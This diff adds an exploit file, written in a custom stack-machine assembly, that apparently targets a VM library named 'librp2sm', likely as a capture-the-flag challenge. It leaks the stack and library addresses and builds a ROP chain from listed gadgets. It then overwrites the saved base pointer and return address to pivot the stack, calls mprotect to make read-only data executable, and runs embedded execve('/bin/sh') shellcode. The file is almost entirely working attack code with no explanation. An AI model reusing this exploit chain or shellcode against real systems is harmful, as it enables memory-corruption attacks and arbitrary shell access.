@@ -1,0 +1,156 @@
+/*
+Gadgets:
+0x233a: ret leak
+0x2b21: leave; ret;
+0x2b51: mprotect(_, _, PROT_READ | PROT_EXEC); (5*8 load)
+0x2472: pop rdi; ret;
+0x228f: pop rsi; ret;
+
+ASSUMING: all address arithmetic doesn't cross (1<<32) address boundary
+*/
+
+function entry(args: 2, ret: 1, locals: 6) {
+    call stack_sicer
+
+    local.set 0 // rodata hi
+    local.set 1 // rodata lo
+
+    // data hi
+    local.set 2 // ropchain_top hi
+    // data lo
+    li ropchain_top
+    add
+    local.set 3 // ropchain_top lo
+
+    // ret leak hi
+    local.set 4 // librp2sm base hi
+    // ret leak lo
+    li 0x233a
+    sub
+    local.set 5 // librp2sm base lo
+
+
+    local.get 4 // librp2sm base hi
+    dup; dup
+    li mprot_hi
+    mem.sw
+    li poprsi_hi
+    mem.sw
+    li poprdi_hi
+    mem.sw
+
+    local.get 5 // librp2sm base lo
+    dup; dup
+    li 0x2b51 // mprotect
+    add
+    li mprot_lo
+    mem.sw
+    li 0x2472 // pop rdi
+    add
+    li poprdi_lo
+    mem.sw
+    li 0x228f // pop rsi
+    add
+    li poprsi_lo
+    mem.sw
+
+    local.get 0 // rodata hi
+    dup
+    li rodata_hi1
+    mem.sw
+    li rodata_hi2
+    mem.sw
+    local.get 1 // rodata lo
+    dup
+    li rodata_lo1
+    mem.sw
+    li rodata_lo2
+    mem.sw
+
+
+    li 0 // dummy stack spacer
+    local.get 3 // ropchain_top lo
+    call writer1 // savedrbp lo
+    local.get 2 // ropchain_top hi
+    call writer2 // savedrbp lo
+
+    drop // remove spacer
+    local.get 5 // librp2sm base lo
+    li 0x2b21
+    add
+    call writer1 // ret addr lo
+    local.get 4 // librp2sm base hi
+    call writer2 // ret addr hi
+
+    /*call dummy*/
+
+    li 0
+}
+
+function stack_sicer(ret: 6, locals: 8) {
+    local.get 7 // ret leak lo
+    local.get 6 // ret leak hi
+    local.get 5 // data lo
+    local.get 4 // data hi
+    local.get 3 // rodata lo
+    local.get 2 // rodata hi
+}
+
+rodata {
+    // execve("/bin/sh") shellcode
+    db "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+}
+
+data {
+    ropchain_top:
+    dw 0, 0 // rbp
+    poprdi_lo:  dw 0; poprdi_hi:  dw 0
+    rodata_lo1: dw 0; rodata_hi1: dw 0
+    poprsi_lo:  dw 0; poprsi_hi:  dw 0
+    dw 0x1000, 0 // len
+    mprot_lo: dw 0; mprot_hi: dw 0
+    dw 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 // mprot pad
+    rodata_lo2: dw 0; rodata_hi2: dw 0
+}
+
+function writer1(args: 1, locals: 2) {
+    li 2
+    local.set 0
+
+    li 0; li 0; li 0; li 0; li 0; li 0; li 0; li 0; li 0
+l1:
+    local.get 0
+    eqz
+    br_if l2
+    local.get 0
+    li 1
+    sub
+    local.set 0
+    drop; drop; drop; drop; drop; drop; drop; drop; drop
+    br l1
+
+l2:
+    arg.get 0
+}
+
+function writer2(args: 1, locals: 1) {
+    li 2
+    local.set 0
+
+    li 0; li 0; li 0; li 0; li 0; li 0; li 0; li 0; li 0
+l1:
+    local.get 0
+    eqz
+    br_if l2
+    local.get 0
+    li 1
+    sub
+    local.set 0
+    drop; drop; drop; drop; drop; drop; drop; drop; drop
+    br l1
+
+l2:
+    arg.get 0
+}
+
+/*function dummy() {}*/
